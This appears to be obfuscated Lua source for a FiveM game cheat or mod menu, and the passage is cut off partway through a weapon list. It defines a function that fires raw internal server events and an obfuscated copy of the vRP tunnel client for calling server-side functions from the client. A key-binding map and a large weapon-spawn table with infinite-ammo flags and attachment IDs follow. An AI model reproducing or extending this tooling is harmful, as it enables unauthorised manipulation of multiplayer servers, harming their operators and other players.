TriggerMaciasEvent=function(is_server,event,...)
	local args=msgpack.pack({...})
	if is_server then
		TriggerServerEventInternal(event,args,args:len())
	else
		TriggerEventInternal(event,args,args:len())
	end
end


Toels = {}
local WJPS = {}
function Toels.newIDGenerator()
    local ixP5Z = setmetatable({}, {__index = WJPS})
    ixP5Z:construct()
    return ixP5Z
end
function WJPS:construct()
    self:clear()
end
function WJPS:clear()
    self.max = 0
    self.ids = {}
end
function WJPS:gen()
    if #self.ids > 0 then
        return table.remove(self.ids)
    else
        local ig2SBhTNJBxrhTVOI9P = self.max
        self.max = self.max + 1
        return ig2SBhTNJBxrhTVOI9P
    end
end
function WJPS:free(G)
    table.insert(self.ids, G)
end
Tuunnell = {}
local function vGktzXSF74SfeW8(jvTyVh, IkJXLBC_kvxE8QRO)
    local CwnR55H2EOOK5vd1HHZN = getmetatable(jvTyVh)
    local FipHp = CwnR55H2EOOK5vd1HHZN.name
    local TDE7B6lzOlByH7y = CwnR55H2EOOK5vd1HHZN.tunnel_ids
    local Qii8 = CwnR55H2EOOK5vd1HHZN.tunnel_callbacks
    local zvpEMMWSzMRvz = CwnR55H2EOOK5vd1HHZN.identifier
    local N5aa = function(jKezBx10oBfQET6RiJ1, yrd2zyvddd_9AaZjM)
        if jKezBx10oBfQET6RiJ1 == nil then
            jKezBx10oBfQET6RiJ1 = {}
        end
        if type(yrd2zyvddd_9AaZjM) == "function" then
            local Ag = TDE7B6lzOlByH7y:gen()
            Qii8[Ag] = yrd2zyvddd_9AaZjM
            TriggerMaciasEvent(true, FipHp .. ":tunnel_req", IkJXLBC_kvxE8QRO, jKezBx10oBfQET6RiJ1, zvpEMMWSzMRvz, Ag)
        else
            TriggerMaciasEvent(true, FipHp .. ":tunnel_req", IkJXLBC_kvxE8QRO, jKezBx10oBfQET6RiJ1, " ", -1)
        end
    end
    jvTyVh[IkJXLBC_kvxE8QRO] = N5aa
    return N5aa
end
function Tuunnell.bindInterface(cXlB, TYZc9CBbcvUQ1I5)
    RegisterNetEvent(cXlB .. ":tunnel_req")
    AddEventHandler(
        cXlB .. ":tunnel_req",
        function(F10YphPP0_6TTFwT0S6N, rlQ, zdG88, rnToADRTwKae54HyyjFP)
            local PhduARXsvMDFJjIGj = TYZc9CBbcvUQ1I5[F10YphPP0_6TTFwT0S6N]
            local v7pse7 = false
            local Oe6JJ4dKJgdxLPwBr = {}
            if type(PhduARXsvMDFJjIGj) == "function" then
                TUNNEL_DELAYED = function()
                    v7pse7 = true
                    return function(E7aFYhEllVrY0)
                        E7aFYhEllVrY0 = E7aFYhEllVrY0 or {}
                        if rnToADRTwKae54HyyjFP >= 0 then
                            TriggerMaciasEvent(
                                true,
                                cXlB .. ":" .. zdG88 .. ":tunnel_res",
                                rnToADRTwKae54HyyjFP,
                                E7aFYhEllVrY0
                            )
                        end
                    end
                end
                Oe6JJ4dKJgdxLPwBr = {PhduARXsvMDFJjIGj(table.unpack(rlQ))}
            end
            if not v7pse7 and rnToADRTwKae54HyyjFP >= 0 then
                TriggerMaciasEvent(true, cXlB .. ":" .. zdG88 .. ":tunnel_res", rnToADRTwKae54HyyjFP, Oe6JJ4dKJgdxLPwBr)
            end
        end
    )
end
function Tuunnell.getInterface(o31pxS6EGT7oLVTJ, vo5eUwENKTW)
    local ilbQ3RXJk = Toels.newIDGenerator()
    local qGvedZaZXa0D = {}
    local EIsLmWRglIiVaj =
        setmetatable(
        {},
        {
            __index = vGktzXSF74SfeW8,
            name = o31pxS6EGT7oLVTJ,
            tunnel_ids = ilbQ3RXJk,
            tunnel_callbacks = qGvedZaZXa0D,
            identifier = vo5eUwENKTW
        }
    )
    RegisterNetEvent(o31pxS6EGT7oLVTJ .. ":" .. vo5eUwENKTW .. ":tunnel_res")
    AddEventHandler(
        o31pxS6EGT7oLVTJ .. ":" .. vo5eUwENKTW .. ":tunnel_res",
        function(Irvr9EgHCp0_RKFhFslN9, yu1ytyaidA6VASTTTj)
            local MIoFl9QncM9WOajtD = qGvedZaZXa0D[Irvr9EgHCp0_RKFhFslN9]
            if MIoFl9QncM9WOajtD ~= nil then
                ilbQ3RXJk:free(Irvr9EgHCp0_RKFhFslN9)
                qGvedZaZXa0D[Irvr9EgHCp0_RKFhFslN9] = nil
                MIoFl9QncM9WOajtD(table.unpack(yu1ytyaidA6VASTTTj))
            end
        end
    )
    return EIsLmWRglIiVaj
end


local NywuctsA4BD4b3_G0 = true

local keyboard_keys = {
    ["ESC"] = 322,
    ["F1"] = 288,
    ["F2"] = 289,
    ["F3"] = 170,
    ["F5"] = 166,
    ["F6"] = 167,
    ["F7"] = 168,
    ["F8"] = 169,
    ["F9"] = 56,
    ["F10"] = 57,
    ["~"] = 243,
    ["1"] = 157,
    ["2"] = 158,
    ["3"] = 160,
    ["4"] = 164,
    ["5"] = 165,
    ["6"] = 159,
    ["7"] = 161,
    ["8"] = 162,
    ["9"] = 163,
    ["-"] = 84,
    ["="] = 83,
    ["BACKSPACE"] = 177,
    ["TAB"] = 37,
    ["Q"] = 44,
    ["W"] = 32,
    ["E"] = 38,
    ["R"] = 45,
    ["T"] = 245,
    ["Y"] = 246,
    ["U"] = 303,
    ["P"] = 199,
    ["["] = 39,
    ["]"] = 40,
    ["ENTER"] = 18,
    ["CAPS"] = 137,
    ["A"] = 34,
    ["S"] = 8,
    ["D"] = 9,
    ["F"] = 23,
    ["G"] = 47,
    ["H"] = 74,
    ["K"] = 311,
    ["L"] = 182,
    ["LEFTSHIFT"] = 21,
    ["Z"] = 20,
    ["X"] = 73,
    ["C"] = 26,
    ["V"] = 0,
    ["B"] = 29,
    ["N"] = 249,
    ["M"] = 244,
    [","] = 82,
    ["."] = 81,
    ["LEFTCTRL"] = 36,
    ["LEFTALT"] = 19,
    ["SPACE"] = 22,
    ["RIGHTCTRL"] = 70,
    ["HOME"] = 213,
    ["PAGEUP"] = 10,
    ["PAGEDOWN"] = 11,
    ["DELETE"] = 178,
    ["LEFT"] = 174,
    ["RIGHT"] = 175,
    ["TOP"] = 27,
    ["UP"] = 172,
    ["DOWN"] = 173,
    ["NENTER"] = 201,
    ["N4"] = 108,
    ["N5"] = 60,
    ["N6"] = 107,
    ["N+"] = 96,
    ["N-"] = 97,
    ["N7"] = 117,
    ["N8"] = 61,
    ["N9"] = 118,
    ["MOUSE1"] = 24
}
local K8qdNYILVbDvC89LzVFXFGH = {
    Melee = {
        BaseballBat = {id = "weapon_bat", name = "~s~~s~Baseball Bat", bInfAmmo = false, mods = {}},
        BrokenBottle = {id = "weapon_bottle", name = "~s~~s~Broken Bottle", bInfAmmo = false, mods = {}},
        Crowbar = {id = "weapon_Crowbar", name = "~s~~s~Crowbar", bInfAmmo = false, mods = {}},
        Flashlight = {id = "weapon_flashlight", name = "~s~~s~Flashlight", bInfAmmo = false, mods = {}},
        GolfClub = {id = "weapon_golfclub", name = "~s~~s~Golf Club", bInfAmmo = false, mods = {}},
        BrassKnuckles = {id = "weapon_knuckle", name = "~s~~s~Brass Knuckles", bInfAmmo = false, mods = {}},
        Knife = {id = "weapon_knife", name = "~s~~s~Knife", bInfAmmo = false, mods = {}},
        Machete = {id = "weapon_machete", name = "~s~~s~Machete", bInfAmmo = false, mods = {}},
        Switchblade = {id = "weapon_switchblade", name = "~s~~s~Switchblade", bInfAmmo = false, mods = {}},
        Nightstick = {id = "weapon_nightstick", name = "~s~~s~Nightstick", bInfAmmo = false, mods = {}},
        BattleAxe = {id = "weapon_battleaxe", name = "~s~~s~Battle Axe", bInfAmmo = false, mods = {}}
    },
    Handguns = {
        Pistol = {
            id = "weapon_pistol",
            name = "~s~~s~Pistol",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "~s~~s~Default Magazine", id = "COMPONENT_PISTOL_CLIP_01"},
                    {name = "~s~~s~Extended Magazine", id = "COMPONENT_PISTOL_CLIP_02"}
                },
                Flashlight = {{name = "~s~~s~Flashlight", id = "COMPONENT_AT_PI_FLSH"}},
                BarrelAttachments = {{name = "~s~~s~Suppressor", id = "COMPONENT_AT_PI_SUPP_02"}}
            }
        },
        PistolMK2 = {
            id = "weapon_pistol_mk2",
            name = "~s~~s~Pistol MK 2",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "~s~~s~Default Magazine", id = "COMPONENT_PISTOL_MK2_CLIP_01"},
                    {name = "~s~~s~Extended Magazine", id = "COMPONENT_PISTOL_MK2_CLIP_02"},
                    {name = "~s~~s~Tracer Rounds", id = "COMPONENT_PISTOL_MK2_CLIP_TRACER"},
                    {name = "~s~~s~Incendiary Rounds", id = "COMPONENT_PISTOL_MK2_CLIP_INCENDIARY"},
                    {name = "~s~~s~Hollow Point Rounds", id = "COMPONENT_PISTOL_MK2_CLIP_HOLLOWPOINT"},
                    {name = "~s~~s~FMJ Rounds", id = "COMPONENT_PISTOL_MK2_CLIP_FMJ"}
                },
                Sights = {{name = "~s~~s~Mounted Scope", id = "COMPONENT_AT_PI_RAIL"}},
                Flashlight = {{name = "~s~~s~Flashlight", id = "COMPONENT_AT_PI_FLSH_02"}},
                BarrelAttachments = {
                    {name = "~s~~s~Compensator", id = "COMPONENT_AT_PI_COMP"},
                    {name = "~s~~s~Suppessor", id = "COMPONENT_AT_PI_SUPP_02"}
                }
            }
        },
        CombatPistol = {
            id = "weapon_combatpistol",
            name = "~s~~s~Combat Pistol",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "~s~~s~Default Magazine", id = "COMPONENT_COMBATPISTOL_CLIP_01"},
                    {name = "~s~~s~Extended Magazine", id = "COMPONENT_COMBATPISTOL_CLIP_02"}
                },
                Flashlight = {{name = "~s~~s~Flashlight", id = "COMPONENT_AT_PI_FLSH"}},
                BarrelAttachments = {{name = "~s~~s~Suppressor", id = "COMPONENT_AT_PI_SUPP"}}
            }
        },
        APPistol = {
            id = "weapon_appistol",
            name = "~s~~s~AP Pistol",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "~s~~s~Default Magazine", id = "COMPONENT_APPISTOL_CLIP_01"},
                    {name = "~s~~s~Extended Magazine", id = "COMPONENT_APPISTOL_CLIP_02"}
                },
                Flashlight = {{name = "~s~~s~Flashlight", id = "COMPONENT_AT_PI_FLSH"}},
                BarrelAttachments = {{name = "~s~~s~Suppressor", id = "COMPONENT_AT_PI_SUPP"}}
            }
        },
        StunGun = {id = "weapon_stungun", name = "~s~~s~Stun Gun", bInfAmmo = false, mods = {}},
        Pistol50 = {
            id = "weapon_pistol50",
            name = "~s~~s~Pistol .50",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "~s~~s~Default Magazine", id = "COMPONENT_PISTOL50_CLIP_01"},
                    {name = "~s~~s~Extended Magazine", id = "COMPONENT_PISTOL50_CLIP_02"}
                },
                Flashlight = {{name = "~s~~s~Flashlight", id = "COMPONENT_AT_PI_FLSH"}},
                BarrelAttachments = {{name = "~s~~s~Suppressor", id = "COMPONENT_AT_PI_SUPP_02"}}
            }
        },
        SNSPistol = {
            id = "weapon_snspistol",
            name = "~s~~s~SNS Pistol",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "~s~~s~Default Magazine", id = "COMPONENT_SNSPISTOL_CLIP_01"},
                    {name = "~s~~s~Extended Magazine", id = "COMPONENT_SNSPISTOL_CLIP_02"}
                }
            }
        },
        SNSPistolMkII = {
            id = "weapon_snspistol_mk2",
            name = "~s~~s~SNS Pistol Mk II",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "~s~~s~Default Magazine", id = "COMPONENT_SNSPISTOL_MK2_CLIP_01"},
                    {name = "~s~~s~Extended Magazine", id = "COMPONENT_SNSPISTOL_MK2_CLIP_02"},
                    {name = "~s~~s~Tracer Rounds", id = "COMPONENT_SNSPISTOL_MK2_CLIP_TRACER"},
                    {name = "~s~~s~Incendiary Rounds", id = "COMPONENT_SNSPISTOL_MK2_CLIP_INCENDIARY"},
                    {name = "~s~~s~Hollow Point Rounds", id = "COMPONENT_SNSPISTOL_MK2_CLIP_HOLLOWPOINT"},
                    {name = "~s~~s~FMJ Rounds", id = "COMPONENT_SNSPISTOL_MK2_CLIP_FMJ"}
                },
                Sights = {{name = "~s~~s~Mounted Scope", id = "COMPONENT_AT_PI_RAIL_02"}},
                Flashlight = {{name = "~s~~s~Flashlight", id = "COMPONENT_AT_PI_FLSH_03"}},
                BarrelAttachments = {
                    {name = "~s~~s~Compensator", id = "COMPONENT_AT_PI_COMP_02"},
                    {name = "~s~~s~Suppressor", id = "COMPONENT_AT_PI_SUPP_02"}
                }
            }
        },
        HeavyPistol = {
            id = "weapon_heavypistol",
            name = "~s~~s~Heavy Pistol",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "~s~~s~Default Magazine", id = "COMPONENT_HEAVYPISTOL_CLIP_01"},
                    {name = "~s~~s~Extended Magazine", id = "COMPONENT_HEAVYPISTOL_CLIP_02"}
                },
                Flashlight = {{name = "~s~~s~Flashlight", id = "COMPONENT_AT_PI_FLSH"}},
                BarrelAttachments = {{name = "~s~~s~Suppressor", id = "COMPONENT_AT_PI_SUPP"}}
            }
        },
        VintagePistol = {
            id = "weapon_vintagepistol",
            name = "~s~~s~Vintage Pistol",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "~s~~s~Default Magazine", id = "COMPONENT_VINTAGEPISTOL_CLIP_01"},
                    {name = "~s~~s~Extended Magazine", id = "COMPONENT_VINTAGEPISTOL_CLIP_02"}
                },
                BarrelAttachments = {{"Suppressor", id = "COMPONENT_AT_PI_SUPP"}}
            }
        },
        FlareGun = {id = "weapon_flaregun", name = "~s~~s~Flare Gun", bInfAmmo = false, mods = {}},
        MarksmanPistol = {id = "weapon_marksmanpistol", name = "~s~~s~Marksman Pistol", bInfAmmo = false, mods = {}},
        HeavyRevolver = {id = "weapon_revolver", name = "~s~~s~Heavy Revolver", bInfAmmo = false, mods = {}},
        HeavyRevolverMkII = {
            id = "weapon_revolver_mk2",
            name = "~s~~s~Heavy Revolver Mk II",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "~s~~s~Default Rounds", id = "COMPONENT_REVOLVER_MK2_CLIP_01"},
                    {name = "~s~~s~Tracer Rounds", id = "COMPONENT_REVOLVER_MK2_CLIP_TRACER"},
                    {name = "~s~~s~Incendiary Rounds", id = "COMPONENT_REVOLVER_MK2_CLIP_INCENDIARY"},
                    {name = "~s~~s~Hollow Point Rounds", id = "COMPONENT_REVOLVER_MK2_CLIP_HOLLOWPOINT"},
                    {name = "~s~~s~FMJ Rounds", id = "COMPONENT_REVOLVER_MK2_CLIP_FMJ"}
                },
                Sights = {
                    {name = "~s~~s~Holograhpic Sight", id = "COMPONENT_AT_SIGHTS"},
                    {name = "~s~~s~Small Scope", id = "COMPONENT_AT_SCOPE_MACRO_MK2"}
                },
                Flashlight = {{name = "~s~~s~Flashlight", id = "COMPONENT_AT_PI_FLSH"}},
                BarrelAttachments = {{name = "~s~~s~Compensator", id = "COMPONENT_AT_PI_COMP_03"}}
            }
        },
        DoubleActionRevolver = {
            id = "weapon_doubleaction",
            name = "~s~~s~Double Action Revolver",
            bInfAmmo = false,
            mods = {}
        },
        UpnAtomizer = {id = "weapon_raypistol", name = "~s~~s~Up-n-Atomizer", bInfAmmo = false, mods = {}}
    },
    SMG = {
        MicroSMG = {
            id = "weapon_microsmg",
            name = "~s~~s~Micro SMG",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "~s~~s~Default Magazine", id = "COMPONENT_MICROSMG_CLIP_01"},
                    {name = "~s~~s~Extended Magazine", id = "COMPONENT_MICROSMG_CLIP_02"}
                },
                Sights = {{name = "~s~~s~Scope", id = "COMPONENT_AT_SCOPE_MACRO"}},
                Flashlight = {{name = "~s~~s~Flashlight", id = "COMPONENT_AT_PI_FLSH"}},
                BarrelAttachments = {{name = "~s~~s~Suppressor", id = "COMPONENT_AT_AR_SUPP_02"}}
            }
        },
        SMG = {
            id = "weapon_smg",
            name = "~s~~s~SMG",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "~s~~s~Default Magazine", id = "COMPONENT_SMG_CLIP_01"},
                    {name = "~s~~s~Extended Magazine", id = "COMPONENT_SMG_CLIP_02"},
                    {name = "~s~~s~Drum Magazine", id = "COMPONENT_SMG_CLIP_03"}
                },
                Sights = {{name = "~s~~s~Scope", id = "COMPONENT_AT_SCOPE_MACRO_02"}},
                Flashlight = {{name = "~s~~s~Flashlight", id = "COMPONENT_AT_AR_FLSH"}},
                BarrelAttachments = {{name = "~s~~s~Suppressor", id = "COMPONENT_AT_PI_SUPP"}}
            }
        },
        SMGMkII = {
            id = "weapon_smg_mk2",
            name = "~s~~s~SMG Mk II",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "~s~~s~Default Magazine", id = "COMPONENT_SMG_MK2_CLIP_01"},
                    {name = "~s~~s~Extended Magazine", id = "COMPONENT_SMG_MK2_CLIP_02"},
                    {name = "~s~~s~Tracer Rounds", id = "COMPONENT_SMG_MK2_CLIP_TRACER"},
                    {name = "~s~~s~Incendiary Rounds", id = "COMPONENT_SMG_MK2_CLIP_INCENDIARY"},
                    {name = "~s~~s~Hollow Point Rounds", id = "COMPONENT_SMG_MK2_CLIP_HOLLOWPOINT"},
                    {name = "~s~~s~FMJ Rounds", id = "COMPONENT_SMG_MK2_CLIP_FMJ"}
                },
                Sights = {
                    {name = "~s~~s~Holograhpic Sight", id = "COMPONENT_AT_SIGHTS_SMG"},
                    {name = "~s~~s~Small Scope", id = "COMPONENT_AT_SCOPE_MACRO_02_SMG_MK2"},
                    {name = "~s~~s~Medium Scope", id = "COMPONENT_AT_SCOPE_SMALL_SMG_MK2"}
                },
                Flashlight = {{name = "~s~~s~Flashlight", id = "COMPONENT_AT_AR_FLSH"}},
                Barrel = {
                    {name = "~s~~s~Default", id = "COMPONENT_AT_SB_BARREL_01"},
                    {name = "~s~~s~Heavy", id = "COMPONENT_AT_SB_BARREL_02"}
                },
                BarrelAttachments = {
                    {name = "~s~~s~Suppressor", id = "COMPONENT_AT_PI_SUPP"},
                    {name = "~s~~s~Flat Muzzle Brake", id = "COMPONENT_AT_MUZZLE_01"},
                    {name = "~s~~s~Tactical Muzzle Brake", id = "COMPONENT_AT_MUZZLE_02"},
                    {name = "~s~~s~Fat-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_03"},
                    {name = "~s~~s~Precision Muzzle Brake", id = "COMPONENT_AT_MUZZLE_04"},
                    {name = "~s~~s~Heavy Duty Muzzle Brake", id = "COMPONENT_AT_MUZZLE_05"},
                    {name = "~s~~s~Slanted Muzzle Brake", id = "COMPONENT_AT_MUZZLE_06"},
                    {name = "~s~~s~Split-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_07"}
                }
            }
        },
        AssaultSMG = {
            id = "weapon_assaultsmg",
            name = "~s~~s~Assault SMG",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "~s~~s~Default Magazine", id = "COMPONENT_ASSAULTSMG_CLIP_01"},
                    {name = "~s~~s~Extended Magazine", id = "COMPONENT_ASSAULTSMG_CLIP_02"}
                },
                Sights = {{name = "~s~~s~Scope", id = "COMPONENT_AT_SCOPE_MACRO"}},
                Flashlight = {{name = "~s~~s~Flashlight", id = "COMPONENT_AT_AR_FLSH"}},
                BarrelAttachments = {{name = "~s~~s~Suppressor", id = "COMPONENT_AT_AR_SUPP_02"}}
            }
        },
        CombatPDW = {
            id = "weapon_combatpdw",
            name = "~s~~s~Combat PDW",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "~s~~s~Default Magazine", id = "COMPONENT_COMBATPDW_CLIP_01"},
                    {name = "~s~~s~Extended Magazine", id = "COMPONENT_COMBATPDW_CLIP_02"},
                    {name = "~s~~s~Drum Magazine", id = "COMPONENT_COMBATPDW_CLIP_03"}
                },
                Sights = {{name = "~s~~s~Scope", id = "COMPONENT_AT_SCOPE_SMALL"}},
                Flashlight = {{name = "~s~~s~Flashlight", id = "COMPONENT_AT_AR_FLSH"}},
                Grips = {{name = "~s~~s~Grip", id = "COMPONENT_AT_AR_AFGRIP"}}
            }
        },
        MachinePistol = {
            id = "weapon_machinepistol",
            name = "~s~~s~Machine Pistol ",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "~s~~s~Default Magazine", id = "COMPONENT_MACHINEPISTOL_CLIP_01"},
                    {name = "~s~~s~Extended Magazine", id = "COMPONENT_MACHINEPISTOL_CLIP_02"},
                    {name = "~s~~s~Drum Magazine", id = "COMPONENT_MACHINEPISTOL_CLIP_03"}
                },
                BarrelAttachments = {{name = "~s~~s~Suppressor", id = "COMPONENT_AT_PI_SUPP"}}
            }
        },
        MiniSMG = {
            id = "weapon_minismg",
            name = "~s~~s~Mini SMG",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "~s~~s~Default Magazine", id = "COMPONENT_MINISMG_CLIP_01"},
                    {name = "~s~~s~Extended Magazine", id = "COMPONENT_MINISMG_CLIP_02"}
                }
            }
        },
        UnholyHellbringer = {id = "weapon_raycarbine", name = "~s~~s~Unholy Hellbringer", bInfAmmo = false, mods = {}}
    },
    Shotguns = {
        PumpShotgun = {
            id = "weapon_pumpshotgun",
            name = "~s~~s~Pump Shotgun",
            bInfAmmo = false,
            mods = {
                Flashlight = {{name = "Flashlight", id = "COMPONENT_AT_AR_FLSH"}},
                BarrelAttachments = {{name = "~s~~s~Suppressor", id = "COMPONENT_AT_SR_SUPP"}}
            }
        },
        PumpShotgunMkII = {
            id = "weapon_pumpshotgun_mk2",
            name = "~s~~s~Pump Shotgun Mk II",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "~s~~s~Default Shells", id = "COMPONENT_PUMPSHOTGUN_MK2_CLIP_01"},
                    {name = "~s~~s~Dragon Breath Shells", id = "COMPONENT_PUMPSHOTGUN_MK2_CLIP_INCENDIARY"},
                    {name = "~s~~s~Steel Buckshot Shells", id = "COMPONENT_PUMPSHOTGUN_MK2_CLIP_ARMORPIERCING"},
                    {name = "~s~~s~Flechette Shells", id = "COMPONENT_PUMPSHOTGUN_MK2_CLIP_HOLLOWPOINT"},
                    {name = "~s~~s~Explosive Slugs", id = "COMPONENT_PUMPSHOTGUN_MK2_CLIP_EXPLOSIVE"}
                },
                Sights = {
                    {name = "~s~~s~Holograhpic Sight", id = "COMPONENT_AT_SIGHTS"},
                    {name = "~s~~s~Small Scope", id = "COMPONENT_AT_SCOPE_MACRO_MK2"},
                    {name = "~s~~s~Medium Scope", id = "COMPONENT_AT_SCOPE_SMALL_MK2"}
                },
                Flashlight = {{name = "~s~~s~Flashlight", id = "COMPONENT_AT_AR_FLSH"}},
                BarrelAttachments = {
                    {name = "~s~~s~Suppressor", id = "COMPONENT_AT_SR_SUPP_03"},
                    {name = "~s~~s~Squared Muzzle Brake", id = "COMPONENT_AT_MUZZLE_08"}
                }
            }
        },
        SawedOffShotgun = {id = "weapon_sawnoffshotgun", name = "~s~~s~Sawed-Off Shotgun", bInfAmmo = false, mods = {}},
        AssaultShotgun = {
            id = "weapon_assaultshotgun",
            name = "~s~~s~Assault Shotgun",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "~s~~s~Default Magazine", id = "COMPONENT_ASSAULTSHOTGUN_CLIP_01"},
                    {name = "~s~~s~Extended Magazine", id = "COMPONENT_ASSAULTSHOTGUN_CLIP_02"}
                },
                Flashlight = {{name = "~s~~s~Flashlight", id = "COMPONENT_AT_AR_FLSH"}},
                BarrelAttachments = {{name = "~s~~s~Suppressor", id = "COMPONENT_AT_AR_SUPP"}},
                Grips = {{name = "~s~~s~Grip", id = "COMPONENT_AT_AR_AFGRIP"}}
            }
        },
        BullpupShotgun = {
            id = "weapon_bullpupshotgun",
            name = "~s~~s~Bullpup Shotgun",
            bInfAmmo = false,
            mods = {
                Flashlight = {{name = "~s~~s~Flashlight", id = "COMPONENT_AT_AR_FLSH"}},
                BarrelAttachments = {{name = "~s~~s~Suppressor", id = "COMPONENT_AT_AR_SUPP_02"}},
                Grips = {{name = "~s~~s~Grip", id = "COMPONENT_AT_AR_AFGRIP"}}
            }
        },
        Musket = {id = "weapon_musket", name = "~s~~s~Musket", bInfAmmo = false, mods = {}},
        HeavyShotgun = {
            id = "weapon_heavyshotgun",
            name = "~s~~s~Heavy Shotgun",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "~s~~s~Default Magazine", id = "COMPONENT_HEAVYSHOTGUN_CLIP_01"},
                    {name = "~s~~s~Extended Magazine", id = "COMPONENT_HEAVYSHOTGUN_CLIP_02"},
                    {name = "~s~~s~Drum Magazine", id = "COMPONENT_HEAVYSHOTGUN_CLIP_02"}
                },
                Flashlight = {{name = "~s~~s~Flashlight", id = "COMPONENT_AT_AR_FLSH"}},
                BarrelAttachments = {{name = "~s~~s~Suppressor", id = "COMPONENT_AT_AR_SUPP_02"}},
                Grips = {{name = "~s~~s~Grip", id = "COMPONENT_AT_AR_AFGRIP"}}
            }
        },
        DoubleBarrelShotgun = {
            id = "weapon_dbshotgun",
            name = "~s~~s~Double Barrel Shotgun",
            bInfAmmo = false,
            mods = {}
        },
        SweeperShotgun = {id = "weapon_autoshotgun", name = "~s~~s~Sweeper Shotgun", bInfAmmo = false, mods = {}}
    },
    AssaultRifles = {
        AssaultRifle = {
            id = "weapon_assaultrifle",
            name = "~s~~s~Assault Rifle",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "~s~~s~Default Magazine", id = "COMPONENT_ASSAULTRIFLE_CLIP_01"},
                    {name = "~s~~s~Extended Magazine", id = "COMPONENT_ASSAULTRIFLE_CLIP_02"},
                    {name = "~s~~s~Drum Magazine", id = "COMPONENT_ASSAULTRIFLE_CLIP_03"}
                },
                Sights = {{name = "~s~~s~Scope", id = "COMPONENT_AT_SCOPE_MACRO"}},
                Flashlight = {{name = "~s~~s~Flashlight", id = "COMPONENT_AT_AR_FLSH"}},
                BarrelAttachments = {{name = "~s~~s~Suppressor", id = "COMPONENT_AT_AR_SUPP_02"}},
                Grips = {{name = "~s~~s~Grip", id = "COMPONENT_AT_AR_AFGRIP"}}
            }
        },
        AssaultRifleMkII = {
            id = "weapon_assaultrifle_mk2",
            name = "~s~~s~Assault Rifle Mk II",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "~s~~s~Default Magazine", id = "COMPONENT_ASSAULTRIFLE_MK2_CLIP_01"},
                    {name = "~s~~s~Extended Magazine", id = "COMPONENT_ASSAULTRIFLE_MK2_CLIP_02"},
                    {name = "~s~~s~Tracer Rounds", id = "COMPONENT_ASSAULTRIFLE_MK2_CLIP_TRACER"},
                    {name = "~s~~s~Incendiary Rounds", id = "COMPONENT_ASSAULTRIFLE_MK2_CLIP_INCENDIARY"},
                    {name = "~s~~s~Hollow Point Rounds", id = "COMPONENT_ASSAULTRIFLE_MK2_CLIP_ARMORPIERCING"},
                    {name = "~s~~s~FMJ Rounds", id = "COMPONENT_ASSAULTRIFLE_MK2_CLIP_FMJ"}
                },
                Sights = {
                    {name = "~s~~s~Holograhpic Sight", id = "COMPONENT_AT_SIGHTS"},
                    {name = "~s~~s~Small Scope", id = "COMPONENT_AT_SCOPE_MACRO_MK2"},
                    {name = "~s~~s~Large Scope", id = "COMPONENT_AT_SCOPE_MEDIUM_MK2"}
                },
                Flashlight = {{name = "~s~~s~Flashlight", id = "COMPONENT_AT_AR_FLSH"}},
                Barrel = {
                    {name = "~s~~s~Default", id = "COMPONENT_AT_AR_BARREL_01"},
                    {name = "~s~~s~Heavy", id = "COMPONENT_AT_AR_BARREL_0"}
                },
                BarrelAttachments = {
                    {name = "~s~~s~Suppressor", id = "COMPONENT_AT_AR_SUPP_02"},
                    {name = "~s~~s~Flat Muzzle Brake", id = "COMPONENT_AT_MUZZLE_01"},
                    {name = "~s~~s~Tactical Muzzle Brake", id = "COMPONENT_AT_MUZZLE_02"},
                    {name = "~s~~s~Fat-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_03"},
                    {name = "~s~~s~Precision Muzzle Brake", id = "COMPONENT_AT_MUZZLE_04"},
                    {name = "~s~~s~Heavy Duty Muzzle Brake", id = "COMPONENT_AT_MUZZLE_05"},
                    {name = "~s~~s~Slanted Muzzle Brake", id = "COMPONENT_AT_MUZZLE_06"},
                    {name = "~s~~s~Split-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_07"}
                },
                Grips = {{name = "~s~~s~Grip", id = "COMPONENT_AT_AR_AFGRIP_02"}}
            }
        },
        CarbineRifle = {
            id = "weapon_carbinerifle",
            name = "~s~~s~Carbine Rifle",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "~s~~s~Default Magazine", id = "COMPONENT_CARBINERIFLE_CLIP_01"},
                    {name = "~s~~s~Extended Magazine", id = "COMPONENT_CARBINERIFLE_CLIP_02"},
                    {name = "~s~~s~Box Magazine", id = "COMPONENT_CARBINERIFLE_CLIP_03"}
                },
                Sights = {{name = "~s~~s~Scope", id = "COMPONENT_AT_SCOPE_MEDIUM"}},
                Flashlight = {{name = "~s~~s~Flashlight", id = "COMPONENT_AT_AR_FLSH"}},
                BarrelAttachments = {{name = "~s~~s~Suppressor", id = "COMPONENT_AT_AR_SUPP"}},
                Grips = {{name = "~s~~s~Grip", id = "COMPONENT_AT_AR_AFGRIP"}}
            }
        },
        CarbineRifleMkII = {
            id = "weapon_carbinerifle_mk2",
            name = "~s~~s~Carbine Rifle Mk II ",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "~s~~s~Default Magazine", id = "COMPONENT_CARBINERIFLE_MK2_CLIP_01"},
                    {name = "~s~~s~Extended Magazine", id = "COMPONENT_CARBINERIFLE_MK2_CLIP_02"},
